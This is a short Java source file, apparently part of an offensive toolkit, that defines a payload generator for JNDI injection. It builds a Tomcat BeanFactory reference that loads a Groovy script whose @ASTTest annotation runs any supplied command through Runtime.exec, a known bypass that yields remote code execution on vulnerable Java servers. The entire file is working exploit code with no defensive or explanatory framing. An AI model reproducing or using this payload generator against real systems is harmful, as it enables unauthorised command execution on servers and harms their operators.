package com.xyuxu.javasec.core.payload.jndi;

import org.apache.naming.ResourceRef;
import javax.naming.Reference;
import javax.naming.StringRefAddr;

public class GrooveBypass implements BypassGenerator {

    @Override
    public Reference generate(String command) {

        ResourceRef ref = new ResourceRef(
                "groovy.lang.GroovyClassLoader",
                null, "", "", true,
                "org.apache.naming.factory.BeanFactory",
                null
        );
        ref.add(new StringRefAddr("forceString", "x=parseClass"));

        String script = String.format(
                "@groovy.transform.ASTTest(value={" +
                        " assert java.lang.Runtime.getRuntime().exec(\"%s\")" +
                        "})def x",
                command
        );
        ref.add(new StringRefAddr("x", script));
        return ref;
    }
}